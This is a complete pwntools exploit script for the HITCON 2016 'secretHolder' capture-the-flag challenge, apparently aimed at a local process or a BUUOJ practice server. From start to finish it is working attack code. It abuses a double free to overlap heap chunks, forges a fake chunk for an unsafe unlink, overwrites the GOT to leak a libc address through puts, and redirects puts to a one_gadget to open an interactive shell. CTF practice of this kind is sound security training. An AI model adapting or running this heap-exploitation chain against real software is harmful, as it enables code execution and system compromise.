# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'secretHolder_hitcon_2016'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 27294)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

big_chunk_ptr = 0x6020A0
huge_chunk_ptr = 0x6020A8
small_chunk_ptr = 0x6020B0

# 1 => full
# 0 => empty
isBig_full = 0x6020B8
isHuge_full = 0x6020BC
isSmall_full = 0x6020C0

def keep(choice):
    p.sendlineafter("3. Renew secret\n", '1')
    p.sendlineafter("3. Huge secret\n", str(choice))
    if choice == 1:
        p.sendafter("Tell me your secret: \n", 'small')
    if choice == 2:
        p.sendafter("Tell me your secret: \n", 'big')
    if choice == 3:
        p.sendafter("Tell me your secret: \n", 'huge')

def wipe(choice):
    p.sendlineafter("3. Renew secret\n", '2')
    p.sendlineafter("3. Huge secret\n", str(choice))
    if choice == 1:
        log.success('small chunk is wipped')
    if choice == 2:
        log.success('big chunk is wipped')
    if choice == 3:
        log.success('huge chunk is wipped')

def renew(choice, content):
    p.sendlineafter("3. Renew secret\n", '3')
    p.sendlineafter("3. Huge secret\n", str(choice))
    p.sendafter('Tell me your secret: \n', content)

def unlink():

    #########################################################
    ## fake chunk               -->         big chunk      ##
    ## prev_size & PREV_INUSE   -->         huge chunk     ## 
    ##                                                     ##
    ## unlink big chunk & huge chunk                       ##
    #########################################################

    keep(1)                     # add small chunk
    # debug(0)
    wipe(1)                     # free small chunk
    # debug(0)
    keep(2)                     # add big chunk
    # debug(0)
    wipe(1)                     # double free small chunk and keep the big_chunk_flag(isBig_full=1)
    # debug(0)
    keep(1)                     # add small chunk to overlap the big chunk
    # debug(0)
    keep(3)                     # add huge chunk to trigger mmap
    # debug(0)
    wipe(3)                     # free huge chunk to keep the new top_chunk_size
    # debug(0)
    keep(3)                     # now have a huge chunk to set prev_size & PREV_INUSE
    # debug(0)

    #################### fake chunk & prev_size & size ###################
    payload  = p64(0)                           # fake prev_size
    payload += p64(0x21)                        # fake size
    payload += p64(small_chunk_ptr - 0x18)      # fake fd
    payload += p64(small_chunk_ptr - 0x10)      # fake bk
    payload += p64(0x20)                        # fake prev_size of next
    payload += p64(0x61a90)                     # fake size of next
    renew(2, payload)                           # uaf big chunk
    # debug(0)
    wipe(3)                                     # unsafe unlink attack
    # debug(0)

def leak():
    global one_gadget

    payload  = 'a' * 0x8
    payload += p64(elf.got['free'])             # *big_chunk_ptr = free@got.plt
    payload += 'b' * 0x8
    payload += p64(big_chunk_ptr)               # *small_chunk_ptr = big_chunk_ptr
    renew(1, payload)
    # debug(0)
    renew(2, p64(elf.plt['puts']))              # *free@got.plt = puts@plt
    # debug(0)
    renew(1, p64(elf.got['puts']))              # *big_chunk_ptr = puts@got.plt
    # debug(0)

    wipe(2)                                     # puts(puts@got.plt)
    # debug(0)

    puts_addr = u64(p.recvline()[:6] + "\x00\x00")
    libc_base = puts_addr - libc.sym['puts']
    one_gadget = libc_base + 0x45226
    log.success('puts_addr => ' + hex(puts_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('one_gadget => ' + hex(one_gadget))

def pwn():
    payload  = 'c' * 0x10
    payload += p64(elf.got['puts'])             # *small_chunk_ptr = puts@got.plt
    renew(1, payload)
    # debug(0)
    renew(1, p64(one_gadget))                   # *puts@got.plt = one_gadget
    # debug(0)
    p.interactive()

if __name__ == '__main__':
    unlink()
    leak()
    pwn()

